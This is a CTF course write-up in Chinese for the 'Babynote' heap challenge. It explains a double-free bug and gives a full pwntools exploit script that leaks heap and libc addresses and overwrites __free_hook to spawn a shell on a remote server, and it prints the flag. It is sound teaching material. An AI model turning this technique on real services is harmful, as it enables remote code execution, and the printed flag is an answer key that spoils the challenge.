---
tags: 2020 程式安全
---
# HWB
## Babynote
### 分析
* 直接拉進ida裡面分析會看到這題是heap的菜單題  
![](https://i.imgur.com/Gkbu2dD.png)
* 在create的時候會限制create的大小要在0x18到0x78之間也就是fastbin的大小然後create完會把used設成1並且總共最多只能create 10個note
![](https://i.imgur.com/7fIjjXi.png)
* 在show的時候會限制那個note裡面要有東西而且used要是1才能夠show
![](https://i.imgur.com/Ninq2Z0.png)
* edit的時候note裡面有東西然後used設成1的才能夠被edit  
![](https://i.imgur.com/yuW2XNK.png)
* 最後是delete他這邊檢查note裡面是不是有東西然後就可以delete掉並且把used設成0
![](https://i.imgur.com/qWWQqIU.png)
### 漏洞
* 在delete的時候free完沒有對used做檢查所以造成有double free的漏洞
* 在delete的時候free完沒有對裡面的內容清空造成information leak
### Exploit
* 這個版本是libc 2.31有tcache所以free掉之後又malloc會拿到同一塊的記憶體
* 因為有double free的漏洞再加上tcache的關係就可以變成有任意寫的漏洞
* 因為tcache被free掉之後上面會記錄heap的位置所以就利用double free來leak出heap base的位置
* 有heap的位置之後就能夠知道之後被malloc出來的chunk會落在哪裡就可以利用tcache造成的任意寫入漏洞來偽造chunk的header因為如果chunk的大小不是tcache的大小他就不會進到tcache裡面會進到unsorted bin
* 當chunk進到unsorted bin裡面之後chunk上面會main arena的位置這個在libc裡面所以就可以偽造chunk header size來讓chunk進到unsorted bin來leak出libc的位置
* 當拿到libc的位置之後就可以知道free_hook的位置如果在free_hook上面寫上system的位置在呼叫free的時候就會變成是呼叫system
* 然後因為只要被free會帶一個參數就是chunk的位置所以如果被free掉的那個chunk上面有`/bin/sh`這樣去呼叫free的時候就會變成system('/bin/sh')成功開啟一個shell
```python=
from pwn import *

# p = process('./babynote')
p = remote('140.112.31.97', 30203)
elf = ELF('./babynote')
libc = elf.libc

def create(size, content):
    p.sendafter('>', '1')
    p.sendafter('size : ', str(size))
    p.sendafter('Content : ', content)

def show(index):
    p.sendafter('>', '2')
    p.sendafter('index : ', str(index))

def edit(index, content):
    p.sendafter('>', '3')
    p.sendafter('index : ', str(index))
    p.sendafter('Content : ', content)

def delete(index):
    p.sendafter('>', '4')
    p.sendafter('index : ', str(index))

# double free tcache to leak heap base
create(0x18, 'a')   # 0
delete(0)
create(0x18, 'a')   # 1
delete(0)
edit(1, p64(0)+p64(0))
delete(0)
show(1)
heap = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x2a0
success('heap = 0x%x', heap)

# write fake chunk size to make fastbin look like unsorted bin and use double free fake unsorted bin to leak libc base
create(0x78, 'a')   # 2
delete(2)
create(0x78, 'a') # 3
create(0x78, p64(0)*9+p64(0x21)+p64(0)*3+p64(0x21)) # 4

edit(1, p64(heap+0x2b0)+p64(0))
create(0x18, 'a')   # 5
create(0x18, p64(0)+p64(0xd1)) # 6
for i in range(7):
    delete(2)
    edit(3, p64(0)*2)
delete(2)
show(3)
libc_base = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1ebbe0
success('libc base = 0x%x', libc_base)

# use double free to overwrite __free_hook to system
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
delete(0)
edit(1, p64(0)+p64(0))
delete(0)
edit(1, p64(free_hook-8)+p64(0))
create(0x18, 'a')   # 7
create(0x18, b'/bin/sh\x00'+p64(system))   # 8
delete(8)

p.interactive()
```
>FLAG{4pp4rently_bab1es_can_wr1t3_n0t3s}
## Childnote